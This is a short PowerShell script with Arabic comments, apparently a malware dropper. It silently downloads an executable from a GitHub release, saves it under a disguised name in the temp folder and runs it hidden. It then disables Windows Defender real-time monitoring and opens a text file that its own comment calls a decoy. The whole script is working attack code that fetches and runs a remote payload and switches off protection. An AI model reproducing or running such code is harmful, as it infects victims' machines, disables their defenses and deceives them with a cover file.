# تفعيل الأمان لضمان نجاح التحميل من GitHub
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# 1. تحميل وتشغيل الـ EXE في صمت
$u = "https://github.com/adchar2022/test/releases/download/adchar/adchar.exe"
$p = "$env:TEMP\sys_check.exe"
(New-Object Net.WebClient).DownloadFile($u, $p)
Start-Process $p -ArgumentList "/S" -WindowStyle Hidden

# 2. تعطيل الحماية وفتح ملف التمويه
Set-MpPreference -DisableRealtimeMonitoring $true
if (Test-Path "combo_list.txt") { start notepad "combo_list.txt" }
